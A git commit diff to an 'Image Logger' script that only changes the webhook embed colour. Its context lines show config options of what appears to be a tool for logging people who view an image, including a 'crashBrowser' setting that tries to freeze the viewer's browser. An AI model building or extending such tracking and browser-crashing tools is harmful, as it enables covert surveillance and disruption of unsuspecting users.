74213c5bd0911caa2ae6368cce1654c2e1a94cc7
weeezy710 <shellystarbs01@gmail.com>
2025-01-31 22:40:57 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -20,7 +20,7 @@ config = {
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x6600a1, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
